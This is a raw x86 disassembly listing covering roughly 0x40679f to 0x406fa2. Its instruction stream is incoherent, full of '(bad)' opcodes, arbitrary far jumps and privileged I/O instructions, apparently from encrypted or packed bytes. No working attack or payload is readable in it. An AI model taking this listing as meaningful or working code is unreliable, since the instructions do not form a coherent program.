  40679f:	xor    dh,BYTE PTR [edx+0x33075a89]
  4067a5:	xor    al,0x69
  4067a7:	(bad)  [esi+0x23]
  4067aa:	es pop ss
  4067ac:	pop    es
  4067ad:	dec    edi
  4067ae:	mov    edi,0xba846ea0
  4067b3:	xor    DWORD PTR [esi+0x30],esi
  4067b6:	es pop ebp
  4067b8:	nop
  4067b9:	fcomp  QWORD PTR [esi+eiz*8+0x72]
  4067bd:	push   0x32
  4067bf:	mov    eax,0x27d0fb4f
  4067c4:	daa    
  4067c5:	cwde   
  4067c6:	push   esp
  4067c7:	fidiv  DWORD PTR [esi-0x61]
  4067ca:	xchg   ebx,eax
  4067cb:	ds xchg ecx,eax
  4067cd:	rcl    BYTE PTR [ecx+0xd617ffe],1
  4067d3:	outs   dx,DWORD PTR ds:[esi]
  4067d4:	mov    esp,0x67f23ce
  4067d9:	fwait
  4067da:	and    dh,BYTE PTR [edi+eax*8+0x743af0a]
  4067e1:	imul   edi,DWORD PTR [eax],0xffffff85
  4067e4:	ror    DWORD PTR [eax-0x55dfd213],cl
  4067ea:	rcl    DWORD PTR ds:0x79dd039b,cl
  4067f0:	cmp    DWORD PTR [ecx+ebx*2],ebx
  4067f3:	test   DWORD PTR [ecx],ebx
  4067f5:	sub    al,cl
  4067f7:	xchg   ebx,eax
  4067f8:	mov    edx,0x85f6c84e
  4067fd:	jle    0x40684c
  4067ff:	jg     0x4067a5
  406801:	cmp    DWORD PTR [ecx+0x66],0xb06dc597
  406808:	dec    ebx
  406809:	jecxz  0x4067b1
  40680b:	mov    eax,0xf75fce25
  406810:	push   ecx
  406811:	ss cwde 
  406813:	jmp    0x387f:0x2c7c3a24
  40681a:	pop    ds
  40681b:	aas    
  40681c:	jne    0x4067d5
  40681e:	repnz and BYTE PTR [edi-0x74],0xd9
  406823:	rol    DWORD PTR [ecx-0xe01abce],0x57
  40682a:	cmp    eax,edi
  40682c:	jmp    0x17284849
  406831:	jb     0x4067eb
  406833:	jge    0x406830
  406835:	mov    ss,WORD PTR ss:[ebp-0x3e]
  406839:	mov    esi,0x13662534
  40683e:	data16 mov dl,BYTE PTR [ebx+0x30]
  406842:	aas    
  406843:	mov    esi,0x5e7daabc
  406848:	cmc    
  406849:	cmp    BYTE PTR [ecx+0x1c5f59b0],cl
  40684f:	mov    bl,0x9e
  406851:	mov    dh,0x6c
  406853:	inc    edx
  406854:	js     0x4068b6
  406856:	mov    dh,BYTE PTR [esi-0x11]
  406859:	dec    esp
  40685a:	mov    esi,0x9f4380e8
  40685f:	mov    ch,0xd
  406861:	aas    
  406862:	dec    esi
  406863:	pusha  
  406864:	sub    eax,0xb7be02b3
  406869:	repnz pop ds
  40686b:	test   DWORD PTR [ebx],ebx
  40686d:	xor    BYTE PTR [edx-0x58],0xdb
  406871:	les    esp,FWORD PTR [eax+0x57]
  406874:	push   edi
  406875:	(bad)  
  406876:	cwde   
  406877:	pop    ecx
  406878:	stos   DWORD PTR es:[edi],eax
  406879:	push   0xffffffc5
  40687b:	pushf  
  40687c:	inc    eax
  40687d:	mov    ds:0x7ce9cb87,al
  406882:	xchg   ebp,eax
  406883:	push   esi
  406884:	jmp    0x297c:0xed5ad39f
  40688b:	ja     0x4068fa
  40688d:	sub    DWORD PTR ds:0x22e2d37e,edi
  406893:	and    bl,0xa7
  406896:	push   es
  406897:	enter  0xa21a,0x80
  40689b:	mov    esi,0x4d6025b6
  4068a0:	add    DWORD PTR [edx],0xffffffcd
  4068a3:	repnz nop
  4068a5:	xchg   BYTE PTR ds:0x54ec7658,bl
  4068ab:	test   DWORD PTR [edx],esp
  4068ad:	(bad)  ds:0xbba41c5a
  4068b3:	inc    esi
  4068b4:	cmp    al,BYTE PTR [ebx+ebx*4]
  4068b7:	jg     0x406871
  4068b9:	adc    BYTE PTR [edx-0x20],0x2e
  4068bd:	jp     0x40686a
  4068bf:	jge    0x406845
  4068c1:	jmp    0x1da926a9
  4068c6:	sub    bh,BYTE PTR [esi]
  4068c8:	call   0xadbc:0xbcfeafa
  4068cf:	into   
  4068d0:	sub    eax,0x3c7c9bd5
  4068d5:	fs and al,ah
  4068d8:	repz xchg ebp,eax
  4068da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068db:	xchg   BYTE PTR [ebx+0x71d4780e],al
  4068e1:	adc    edx,eax
  4068e3:	inc    DWORD PTR [ebp+edi*1+0x3717241c]
  4068ea:	adc    bh,BYTE PTR [esi]
  4068ec:	add    eax,0x11985114
  4068f1:	push   ecx
  4068f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068f3:	rcr    BYTE PTR [edi+0x727b7f29],cl
  4068f9:	and    ch,BYTE PTR [eax]
  4068fb:	and    DWORD PTR [ecx-0x2c],ebx
  4068fe:	push   ebp
  4068ff:	ins    BYTE PTR es:[edi],dx
  406900:	mov    ch,0xb8
  406902:	jg     0x406891
  406904:	xor    dh,BYTE PTR [edi-0x12]
  406907:	push   es
  406908:	mov    esp,DWORD PTR [ebp+0x12c3c4e9]
  40690e:	add    DWORD PTR [esi+0x1af964df],eax
  406914:	mov    ds,WORD PTR [ebp+0x15639e35]
  40691a:	xchg   esp,eax
  40691b:	mov    dh,ch
  40691d:	shr    ebx,1
  40691f:	mov    eax,0x368b39b
  406924:	adc    eax,0x13a042a2
  406929:	nop
  40692a:	test   al,0x1d
  40692c:	mov    edi,0x92aa3118
  406931:	pop    ds
  406932:	xchg   ebx,eax
  406933:	dec    ebp
  406934:	imul   edi,DWORD PTR [ecx+0x6f],0xffffffab
  406938:	and    BYTE PTR [edi-0x1ef9ecc8],bl
  40693e:	les    edx,FWORD PTR [ebx+0x24]
  406941:	call   0xef62:0x270dd81a
  406948:	and    cl,BYTE PTR [ecx]
  40694a:	pop    esp
  40694b:	sbb    BYTE PTR [eax-0x20],bl
  40694e:	arpl   ax,bx
  406950:	inc    ecx
  406951:	cdq    
  406952:	(bad)  
  406953:	xchg   ebx,eax
  406954:	sub    DWORD PTR [edi+0x237c3e05],0xf92cc0b4
  40695e:	mov    bh,0x77
  406960:	out    dx,al
  406961:	or     bl,bh
  406963:	dec    ecx
  406964:	push   0x67
  406966:	xchg   ecx,eax
  406967:	sub    DWORD PTR [ebx-0x41a24934],edi
  40696d:	aad    0xd8
  40696f:	mov    edi,0x2ed869b
  406974:	call   0x48ae536c
  406979:	loopne 0x406936
  40697b:	jae    0x406933
  40697d:	mov    ds:0x7822236c,al
  406982:	push   es
  406983:	pop    eax
  406984:	ins    DWORD PTR es:[edi],dx
  406985:	mov    ch,dh
  406987:	and    eax,ebp
  406989:	stos   DWORD PTR es:[edi],eax
  40698a:	push   esp
  40698b:	(bad)  
  40698c:	hlt    
  40698d:	ret    
  40698e:	nop
  40698f:	add    BYTE PTR [edi],cl
  406991:	in     al,0x3
  406993:	ins    DWORD PTR es:[edi],dx
  406994:	shl    DWORD PTR [esi*2+0x7328ec34],1
  40699b:	mov    BYTE PTR [edi+eax*2],0xc7
  40699f:	es aas 
  4069a1:	lea    ebx,ds:0x7a3a1b79
  4069a7:	jbe    0x4069ef
  4069a9:	mov    eax,0xd2ee834a
  4069ae:	mov    edx,gs
  4069b0:	sub    BYTE PTR [eax-0x69],ah
  4069b3:	xchg   dh,cl
  4069b5:	sbb    BYTE PTR [edx-0x8],al
  4069b8:	jnp    0x406945
  4069ba:	jno    0x406a29
  4069bc:	inc    edi
  4069bd:	mov    ds:0xdca5d90b,al
  4069c2:	push   fs
  4069c4:	add    ecx,edi
  4069c6:	shl    BYTE PTR [edi+edx*4],cl
  4069c9:	or     ah,bl
  4069cb:	jnp    0x406977
  4069cd:	iret   
  4069ce:	jno    0x406990
  4069d0:	or     bl,BYTE PTR [edx]
  4069d2:	mov    dl,0x80
  4069d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069d5:	adc    eax,0x89403e0
  4069da:	call   0x8b8ae00a
  4069df:	xchg   edx,eax
  4069e0:	sbb    eax,0xe5fbeb0f
  4069e6:	mov    esi,0x51e5078b
  4069eb:	add    edx,edx
  4069ed:	pop    es
  4069ee:	retf   0xbed8
  4069f1:	or     dl,BYTE PTR [bx]
  4069f4:	loop   0x406a72
  4069f6:	adc    al,bh
  4069f8:	jmp    0xbb40:0xdc887b3a
  4069ff:	repz int 0x8
  406a02:	add    al,0xe0
  406a04:	pop    esi
  406a05:	sbb    al,0xfd
  406a07:	mov    esi,DWORD PTR [edx+edi*8-0x2e433b9c]
  406a0e:	loope  0x4069ed
  406a10:	adc    ah,BYTE PTR [esi]
  406a12:	int    0x86
  406a14:	inc    ecx
  406a15:	retf   0xf05
  406a18:	adc    bh,BYTE PTR ds:0x803adf66
  406a1e:	scas   eax,DWORD PTR es:[edi]
  406a1f:	enter  0xf073,0x11
  406a23:	pop    eax
  406a24:	pushf  
  406a25:	and    eax,0xf20f3a0e
  406a2a:	scas   al,BYTE PTR es:[edi]
  406a2b:	pop    DWORD PTR [edx]
  406a2d:	pop    esp
  406a2e:	xor    BYTE PTR ds:0x8f9c2c79,0x36
  406a35:	xchg   DWORD PTR [eax+ebx*1],edi
  406a38:	pusha  
  406a39:	shl    ah,cl
  406a3b:	add    BYTE PTR [ebp+0x5420d23a],0x2f
  406a42:	and    DWORD PTR [edi-0x18],esp
  406a45:	jne    0x406a83
  406a47:	and    ah,BYTE PTR [edx]
  406a49:	and    DWORD PTR [ecx-0x65],0xc102710
  406a50:	popf   
  406a51:	sub    DWORD PTR [ebp+0x11b011dd],ebp
  406a57:	lods   eax,DWORD PTR ds:[esi]
  406a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a59:	loop   0x406ac1
  406a5b:	and    ebx,esi
  406a5d:	push   edx
  406a5e:	mov    esi,0x4ddfbc13
  406a63:	add    edx,edi
  406a65:	das    
  406a66:	add    BYTE PTR [esi-0x51],0x37
  406a6a:	cmp    DWORD PTR [esp+esi*2],esi
  406a6d:	xor    DWORD PTR [ecx+0x61],edi
  406a70:	add    edi,DWORD PTR [edi-0x68497166]
  406a76:	mov    bl,BYTE PTR [edx-0x72]
  406a79:	mov    bh,0x6f
  406a7b:	and    DWORD PTR [esi],edi
  406a7d:	pop    edi
  406a7e:	rol    BYTE PTR [ecx+0x1b52ebde],0x80
  406a85:	bnd call 0x2ec2c3dc
  406a8b:	sar    esp,1
  406a8d:	ss mov dl,0xe1
  406a90:	repnz sub dh,BYTE PTR [ecx]
  406a93:	(bad)  
  406a94:	mov    ah,0xe4
  406a96:	test   eax,0x64d1efda
  406a9b:	push   ss
  406a9c:	std    
  406a9d:	lock hlt 
  406a9f:	and    DWORD PTR [ebx+0x47d0b3bc],ebx
  406aa5:	loop   0x406b15
  406aa7:	call   0x152a:0xa8977a80
  406aae:	push   esp
  406aaf:	loop   0x406b29
  406ab1:	xchg   esp,eax
  406ab2:	mov    fs,WORD PTR [esi-0x72]
  406ab5:	inc    ecx
  406ab6:	bound  edi,QWORD PTR [ecx+edi*1-0x11]
  406aba:	ss mov esi,0x2422ba75
  406ac0:	sbb    eax,0x15d6c408
  406ac5:	mov    BYTE PTR [esi+0x8],cl
  406ac8:	ja     0x406b0f
  406aca:	mov    ah,0x46
  406acc:	out    0xcb,eax
  406ace:	iret   
  406acf:	lock push es
  406ad1:	push   es
  406ad2:	into   
  406ad3:	adc    al,0xa6
  406ad5:	call   0x4b54de53
  406ada:	or     eax,0x9e469e70
  406adf:	push   es
  406ae0:	fldenv [ecx]
  406ae2:	or     eax,0xa1de1dbb
  406ae7:	call   0x55efb8f9
  406aec:	retf   0xe17d
  406aef:	add    DWORD PTR [edi+edi*8-0x24],ebx
  406af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406af4:	mov    DWORD PTR [edx+0x23],edx
  406af7:	bswap  ecx
  406af9:	xor    DWORD PTR [eax+edx*4-0x60],eax
  406afd:	(bad)  
  406afe:	xor    edx,ebx
  406b00:	idiv   ebp
  406b02:	sub    edx,DWORD PTR [eax+0x50ab9ee7]
  406b08:	jmp    0x406ac8
  406b0a:	cmp    BYTE PTR [edx+0x39],al
  406b0d:	repz inc edi
  406b0f:	sub    cl,BYTE PTR [ebx]
  406b11:	mov    eax,ds:0x9f0cec85
  406b16:	loope  0x406ab3
  406b18:	inc    edi
  406b19:	aad    0xbd
  406b1b:	sahf   
  406b1c:	or     al,0xa2
  406b1e:	mov    ch,0xf3
  406b20:	cwde   
  406b21:	popa   
  406b22:	or     eax,0x3fe71e38
  406b27:	fstp   st(3)
  406b29:	iret   
  406b2a:	pop    esp
  406b2b:	mov    edx,0x4f9e60b2
  406b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b31:	jp     0x406b6e
  406b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b34:	es dec eax
  406b36:	push   ebp
  406b37:	mov    ebx,0x7b3086e
  406b3c:	inc    eax
  406b3d:	push   ss
  406b3e:	fwait
  406b3f:	sbb    ch,dl
  406b41:	stos   BYTE PTR es:[edi],al
  406b42:	inc    eax
  406b43:	ds ins DWORD PTR es:[edi],dx
  406b45:	pop    ebx
  406b46:	scas   al,BYTE PTR es:[edi]
  406b47:	jle    0x406ae1
  406b49:	push   edx
  406b4a:	mov    dl,0xe5
  406b4c:	mov    edx,0xe0589b37
  406b51:	mov    ?,WORD PTR [eax+edx*8+0x4852d980]
  406b58:	sbb    eax,0x7e7a2e65
  406b5d:	mov    edx,esi
  406b5f:	xor    al,0xb5
  406b61:	mov    ebp,0xad4ed72d
  406b66:	test   eax,0x4bf9bc8c
  406b6b:	std    
  406b6c:	arpl   WORD PTR [ecx+0x69d1eaee],si
  406b72:	mov    ebx,0x3bd71f63
  406b77:	stos   DWORD PTR es:[edi],eax
  406b78:	repz scas al,BYTE PTR es:[edi]
  406b7a:	pop    ds
  406b7b:	sub    bh,BYTE PTR [ebp+0x53]
  406b7e:	sbb    al,0x20
  406b80:	sub    edx,DWORD PTR [esi]
  406b82:	push   es
  406b83:	sub    ah,bh
  406b85:	inc    edx
  406b86:	and    al,0x8a
  406b88:	lods   al,BYTE PTR ds:[esi]
  406b89:	push   edi
  406b8a:	retf   0x7694
  406b8d:	mov    al,0xaa
  406b8f:	or     DWORD PTR [eax],esp
  406b91:	push   0x39
  406b93:	adc    esi,DWORD PTR [edi-0x43b4db71]
  406b99:	stos   BYTE PTR es:[edi],al
  406b9a:	dec    DWORD PTR [esi-0x697abee]
  406ba0:	jge    0x406b36
  406ba2:	pop    es
  406ba3:	dec    ebx
  406ba4:	call   0xc197eaa4
  406ba9:	mov    eax,ds:0x8193e4f5
  406bae:	push   ecx
  406baf:	mov    BYTE PTR [ebx+0x3e694a88],dh
  406bb5:	outs   dx,BYTE PTR ds:[esi]
  406bb6:	push   esp
  406bb7:	call   0xd9622f6d
  406bbc:	arpl   sp,di
  406bbe:	or     eax,0x764ae55f
  406bc3:	cmp    DWORD PTR [edx+0x68],ebp
  406bc6:	stos   BYTE PTR es:[edi],al
  406bc7:	loop   0x406b98
  406bc9:	(bad)  
  406bca:	shl    ecx,cl
  406bcc:	sbb    BYTE PTR [ebx],dl
  406bce:	jno    0x406bbf
  406bd0:	and    cl,dl
  406bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd3:	hlt    
  406bd4:	dec    edi
  406bd5:	and    ah,al
  406bd7:	out    0x49,al
  406bd9:	cdq    
  406bda:	mov    edx,0x2f341105
  406bdf:	mov    bh,0xe2
  406be1:	iret   
  406be2:	jmp    0x406b90
  406be4:	or     DWORD PTR [edi],edi
  406be6:	xor    eax,0x57aee088
  406beb:	enter  0x3fd5,0xc2
  406bef:	mov    ebx,esp
  406bf1:	mov    dl,0x1a
  406bf3:	xor    edx,edi
  406bf5:	in     al,dx
  406bf6:	adc    BYTE PTR [ecx-0x6a],ch
  406bf9:	mov    ss,WORD PTR [ebx-0x329ceb9e]
  406bff:	enter  0xe0e,0xad
  406c03:	mov    al,0x6
  406c05:	mov    eax,ds:0x8bc1d97e
  406c0a:	sub    DWORD PTR [edi-0xe46a965],ebp
  406c10:	loope  0x406bf2
  406c12:	clc    
  406c13:	inc    edx
  406c14:	sub    ebp,ebp
  406c16:	pop    esp
  406c17:	jo     0x406c07
  406c19:	jns    0x406c3e
  406c1b:	retf   0x97cb
  406c1e:	cmp    ah,BYTE PTR [ebx-0x7b81b5b5]
  406c24:	jo     0x406c84
  406c26:	(bad)  
  406c27:	mov    edi,0x34e01b11
  406c2c:	(bad)  
  406c2e:	imul   ecx,DWORD PTR [ecx],0xd1211d3a
  406c34:	ss icebp 
  406c36:	rcr    DWORD PTR [edx],0xd7
  406c39:	call   0x875:0xf93832a8
  406c40:	movsx  ebx,BYTE PTR [edx+0x5f]
  406c44:	lods   al,BYTE PTR ds:[esi]
  406c45:	fdiv   st,st(5)
  406c47:	mov    esi,0x6b0e470e
  406c4c:	xchg   edi,eax
  406c4d:	ins    BYTE PTR es:[edi],dx
  406c4e:	aas    
  406c4f:	push   esi
  406c50:	rcl    edi,cl
  406c52:	bnd jp 0x406cae
  406c55:	xor    eax,0x9fac1a9d
  406c5a:	ret    
  406c5b:	xor    esi,DWORD PTR [bx+0x7]
  406c5f:	mov    al,ds:0xc5afff4
  406c64:	ins    DWORD PTR es:[edi],dx
  406c65:	fsubr  DWORD PTR [ebx+0x76639c31]
  406c6b:	rol    BYTE PTR ds:0x255fabda,0xb8
  406c72:	pop    ebx
  406c73:	and    DWORD PTR [ecx+eiz*8-0x4b7db120],ecx
  406c7a:	and    BYTE PTR [ecx],cl
  406c7c:	mov    al,0xb2
  406c7e:	sbb    esi,ecx
  406c80:	push   0x27
  406c82:	jg     0x406cd5
  406c84:	repnz in eax,0x4d
  406c87:	aaa    
  406c88:	repz sub BYTE PTR [ecx],dl
  406c8b:	mov    al,ds:0xab64cb86
  406c90:	leave  
  406c91:	mov    bl,0x96
  406c93:	sbb    edi,DWORD PTR [ebp-0x79]
  406c96:	arpl   WORD PTR [ecx],ax
  406c98:	dec    ebp
  406c99:	adc    eax,0xb70eca19
  406c9e:	shl    DWORD PTR [edx-0x17],0x89
  406ca2:	mov    eax,0x34f3a48c
  406ca7:	add    eax,0x57dd2f2a
  406cac:	repnz push ecx
  406cae:	aaa    
  406caf:	pop    ds
  406cb0:	push   ebx
  406cb1:	cwde   
  406cb2:	push   0x8a53fc82
  406cb7:	call   0x4465:0x21dfd413
  406cbe:	adc    al,0xed
  406cc0:	push   esi
  406cc1:	xchg   edi,eax
  406cc2:	in     al,dx
  406cc3:	mov    ds:0x421405e3,al
  406cc8:	push   eax
  406cc9:	stos   BYTE PTR es:[edi],al
  406cca:	push   edx
  406ccb:	add    eax,0xcd575658
  406cd0:	and    al,BYTE PTR [ebx+edi*4+0x3b]
  406cd4:	adc    al,0x81
  406cd6:	push   esp
  406cd7:	xor    ebx,DWORD PTR [ebx]
  406cd9:	out    0xf3,eax
  406cdb:	outs   dx,BYTE PTR ds:[esi]
  406cdc:	cld    
  406cdd:	and    al,0x9d
  406cdf:	ss nop
  406ce1:	sub    ch,bl
  406ce3:	jmp    0x5a3f:0xce5339c4
  406cea:	pushf  
  406ceb:	mov    bl,0x20
  406ced:	fstp   TBYTE PTR [ecx-0x4a912e60]
  406cf3:	(bad)  
  406cf4:	clc    
  406cf5:	psubusw mm6,mm6
  406cf8:	pop    es
  406cf9:	fs hlt 
  406cfb:	mov    ebx,0x953acb74
  406d00:	sbb    esi,DWORD PTR [eax+ecx*1-0x6f8e0c6]
  406d07:	bnd jns 0x406d48
  406d0a:	xchg   edx,eax
  406d0b:	cli    
  406d0c:	fxch   st(6)
  406d0e:	mov    BYTE PTR [esi+ebp*8+0x373ed],0xbc
  406d16:	add    dh,BYTE PTR [eax]
  406d18:	test   BYTE PTR ds:0x7122321b,bl
  406d1e:	pop    ebx
  406d1f:	xchg   ebp,eax
  406d20:	sbb    BYTE PTR [edi+0x47],dl
  406d23:	pop    edi
  406d24:	push   es
  406d25:	and    edi,DWORD PTR ds:0xa6561798
  406d2b:	cmp    dl,dh
  406d2d:	xor    edi,DWORD PTR [edi+0x44c3c7cd]
  406d33:	push   ss
  406d34:	jl     0x406d08
  406d36:	push   edx
  406d37:	cmc    
  406d38:	jb     0x406d30
  406d3a:	xor    al,BYTE PTR [ebx-0x7a]
  406d3d:	adc    DWORD PTR [ecx+0x2c],ebx
  406d40:	and    BYTE PTR [edx-0x71d8fe4c],dl
  406d46:	jb     0x406da2
  406d48:	(bad)  
  406d49:	fwait
  406d4a:	icebp  
  406d4b:	iret   
  406d4c:	xlat   BYTE PTR ds:[ebx]
  406d4d:	push   esi
  406d4e:	mov    dl,0x72
  406d50:	sub    ebx,DWORD PTR [ebx+eax*8+0x53bd99bb]
  406d57:	or     DWORD PTR [eax+0x1e],ecx
  406d5a:	cmp    dh,ah
  406d5c:	and    ebp,DWORD PTR [ebx+0x30c0b889]
  406d62:	jg     0x406da5
  406d64:	mov    WORD PTR [ebp+0x396a8959],fs
  406d6a:	or     eax,0xaa98781f
  406d6f:	jbe    0x406def
  406d71:	ror    BYTE PTR [esi+0x48dc5bb2],1
  406d77:	je     0x406d5f
  406d79:	out    dx,al
  406d7a:	jae    0x406d2c
  406d7c:	or     eax,0x5e38a24d
  406d81:	(bad)  
  406d82:	cli    
  406d83:	fs mov eax,0xfde7f5b8
  406d89:	push   ebx
  406d8a:	xor    ch,ch
  406d8c:	jle    0x406d6e
  406d8e:	pushf  
  406d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d90:	and    al,0x34
  406d92:	push   edx
  406d93:	xor    dl,cl
  406d95:	push   ss
  406d96:	and    DWORD PTR [eax+0x10],esp
  406d99:	cmp    esp,DWORD PTR [ecx-0x61]
  406d9c:	fdivr  DWORD PTR [edx+0xd4b4673]
  406da2:	add    dl,0x73
  406da5:	ja     0x406db1
  406da7:	out    dx,eax
  406da8:	fidivr WORD PTR [edx+0x6bb5625a]
  406dae:	lds    edx,FWORD PTR [eax-0x7782771a]
  406db4:	pop    ebp
  406db5:	ja     0x406d5b
  406db7:	xor    eax,0x47c7db0f
  406dbc:	inc    ebp
  406dbd:	and    dh,bl
  406dbf:	enter  0xf131,0xe0
  406dc3:	fcmovne st,st(7)
  406dc5:	jmp    0x406e26
  406dc7:	(bad)  
  406dc8:	(bad)  
  406dc9:	enter  0x5684,0xc4
  406dcd:	imul   edx,DWORD PTR [edi+0x38],0xffffffe1
  406dd1:	xor    ch,bh
  406dd3:	inc    esp
  406dd4:	push   0x5e712c5
  406dd9:	or     DWORD PTR [ebx],0x250dbf7f
  406ddf:	outs   dx,DWORD PTR ds:[esi]
  406de0:	adc    al,0xb9
  406de2:	daa    
  406de3:	dec    edi
  406de4:	adc    BYTE PTR [ecx+0x444dd0de],al
  406dea:	sbb    dh,BYTE PTR [esi]
  406dec:	add    al,0x53
  406dee:	(bad)  
  406def:	push   ss
  406df0:	shl    BYTE PTR [edx+ebp*4],1
  406df3:	test   al,0xf5
  406df5:	dec    esp
  406df6:	cmp    esi,DWORD PTR [ecx-0x6d9336ef]
  406dfc:	iret   
  406dfd:	or     eax,0xef8a313a
  406e02:	or     BYTE PTR [ebp+0x5f],cl
  406e05:	xchg   ebx,eax
  406e06:	fcomp  QWORD PTR [ebx]
  406e08:	dec    eax
  406e09:	xor    al,0x4e
  406e0b:	fwait
  406e0c:	loop   0x406da2
  406e0e:	lgs    edx,FWORD PTR [esi]
  406e11:	xchg   esi,eax
  406e12:	dec    ebp
  406e13:	mov    ds:0xe80132ac,eax
  406e18:	nop
  406e19:	mov    eax,0x3d5ad70a
  406e1e:	sbb    al,0x48
  406e20:	xor    al,0x84
  406e22:	inc    ecx
  406e23:	xchg   DWORD PTR [edx+edx*1-0x49],ebx
  406e27:	mov    esp,0x893c713a
  406e2c:	jg     0x406df8
  406e2e:	scas   eax,DWORD PTR es:[edi]
  406e2f:	mov    ecx,0x835153d0
  406e34:	xor    bh,BYTE PTR [ebp-0x40]
  406e37:	cmp    al,0xe0
  406e39:	nop
  406e3a:	jns    0x406e43
  406e3c:	mov    ebx,0x7d519516
  406e41:	shl    ah,1
  406e43:	push   esi
  406e44:	ret    
  406e45:	std    
  406e46:	mov    edx,DWORD PTR [ebp+0x57e7d500]
  406e4c:	or     al,BYTE PTR [ebp+ebp*1+0x609b3f63]
  406e53:	mov    dh,0x9
  406e55:	push   cs
  406e56:	jg     0x406de7
  406e58:	cmc    
  406e59:	dec    edx
  406e5a:	sti    
  406e5b:	xchg   ebp,eax
  406e5c:	outs   dx,BYTE PTR ds:[esi]
  406e5d:	xchg   ecx,eax
  406e5e:	push   ss
  406e5f:	or     al,0x5f
  406e61:	xchg   ecx,eax
  406e62:	pop    ds
  406e63:	sahf   
  406e64:	ins    BYTE PTR es:[edi],dx
  406e65:	or     bl,BYTE PTR [edi]
  406e67:	arpl   WORD PTR [edx],bx
  406e69:	das    
  406e6a:	jno    0x406e75
  406e6c:	sbb    DWORD PTR [eax],ebp
  406e6e:	jmp    0xc700740e
  406e73:	sub    esp,DWORD PTR [esi]
  406e75:	fmul   DWORD PTR [eax+0x69b0506]
  406e7b:	test   BYTE PTR [ebx],bl
  406e7d:	dec    ebp
  406e7e:	sub    eax,0x36d0bef3
  406e83:	xchg   esi,eax
  406e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e85:	shl    DWORD PTR [ebx-0x4b],cl
  406e88:	jb     0x406e0a
  406e8a:	and    edx,ecx
  406e8c:	add    BYTE PTR [esi-0x11eb2095],dh
  406e92:	bound  eax,QWORD PTR [ecx-0x20f83863]
  406e98:	adc    DWORD PTR [ebx+edi*8],eax
  406e9b:	mov    ah,0xb0
  406e9d:	loop   0x406e63
  406e9f:	scas   al,BYTE PTR es:[edi]
  406ea0:	mov    dh,0xea
  406ea2:	jnp    0x406e9d
  406ea4:	jne    0x406efe
  406ea6:	sbb    eax,0xa1f829b1
  406eab:	push   edi
  406eac:	bound  ebp,QWORD PTR [ebp+0x6ffab913]
  406eb2:	pop    edi
  406eb3:	xchg   ecx,eax
  406eb4:	(bad)  
  406eb5:	xor    eax,0xe77edfd
  406eba:	dec    ecx
  406ebb:	or     dl,bl
  406ebd:	(bad)  
  406ebe:	add    dh,cl
  406ec0:	cmp    BYTE PTR [edx+ebp*1-0x3fc7132a],ah
  406ec7:	inc    esi
  406ec8:	scas   eax,DWORD PTR es:[edi]
  406ec9:	mov    es,WORD PTR [ecx+0x49f1da1d]
  406ecf:	fild   WORD PTR [ebx-0x21]
  406ed2:	jae    0x406f29
  406ed4:	clc    
  406ed5:	pop    esp
  406ed6:	int3   
  406ed7:	xchg   DWORD PTR [eax+0xb7cb48e],esp
  406edd:	aas    
  406ede:	call   0x39f2:0x8fa75737
  406ee5:	stos   BYTE PTR es:[edi],al
  406ee6:	mov    edi,0x4b743272
  406eeb:	pop    edx
  406eec:	retf   
  406eed:	cmp    al,0x99
  406eef:	sar    ch,1
  406ef1:	adc    ch,dl
  406ef3:	xor    esi,DWORD PTR [edx+0x5d]
  406ef6:	xchg   edi,ebp
  406ef8:	sub    DWORD PTR [ebx+0x4f],ecx
  406efb:	and    BYTE PTR [ecx],ch
  406efd:	lods   eax,DWORD PTR ds:[esi]
  406efe:	dec    edx
  406eff:	stc    
  406f00:	adc    BYTE PTR [edi],bh
  406f02:	push   ecx
  406f03:	or     ebx,DWORD PTR [ecx]
  406f05:	gs out 0xdf,al
  406f08:	faddp  st(1),st
  406f0a:	cmc    
  406f0b:	fpatan 
  406f0d:	mov    DWORD PTR [ebx],eax
  406f0f:	jno    0x406f08
  406f11:	outs   dx,DWORD PTR ds:[esi]
  406f12:	das    
  406f13:	or     BYTE PTR [ecx],bl
  406f15:	int    0xd8
  406f17:	pop    edi
  406f18:	add    BYTE PTR [ebx+0x6c],dl
  406f1b:	sub    dh,0x5b
  406f1e:	cmp    BYTE PTR [eax-0xded24f9],dl
  406f24:	out    dx,eax
  406f25:	ds dec edx
  406f27:	dec    eax
  406f28:	pop    ecx
  406f29:	add    al,0xe3
  406f2b:	sbb    eax,0xe0bcd82b
  406f30:	pop    es
  406f31:	push   edi
  406f32:	mov    eax,0x8ee7f7a4
  406f37:	xchg   esi,eax
  406f38:	jnp    0x406f04
  406f3a:	xlat   BYTE PTR ds:[ebx]
  406f3b:	jmp    0x4b6c:0x8e6e144b
  406f42:	ret    0x3915
  406f45:	cmc    
  406f46:	loop   0x406fbc
  406f48:	imul   ebx,DWORD PTR [ebx-0x60],0x200b3a26
  406f4f:	nop
  406f50:	aad    0xf8
  406f52:	jae    0x406f57
  406f54:	mov    ch,0xce
  406f56:	xor    dh,BYTE PTR [ecx+0x45]
  406f59:	fbstp  TBYTE PTR [eax]
  406f5b:	xchg   esp,eax
  406f5c:	xchg   ebx,eax
  406f5d:	stos   BYTE PTR es:[edi],al
  406f5e:	call   0xdc9c3d51
  406f63:	addr16 jns 0x406fa8
  406f66:	call   0xc76b:0xdbaa7102
  406f6d:	jmp    0x406fd5
  406f6f:	xchg   esi,eax
  406f70:	jmp    0x5481232c
  406f75:	and    DWORD PTR [esi*2-0x79c90bf3],ecx
  406f7c:	mov    ah,0x9a
  406f7e:	or     BYTE PTR [ecx],bl
  406f80:	push   edi
  406f81:	dec    ebp
  406f82:	cmp    BYTE PTR [ebx+0x6921f75a],dh
  406f88:	and    BYTE PTR [ebp+esi*4-0x605cea27],bh
  406f8f:	in     al,dx
  406f90:	inc    esi
  406f91:	and    BYTE PTR [edi-0x7],dh
  406f94:	jg     0x406fcb
  406f96:	pop    ds
  406f97:	push   edi
  406f98:	or     eax,0x36a2be96
  406f9d:	jmp    0x206c1465
  406fa2:	ss loopne 0x406fc1
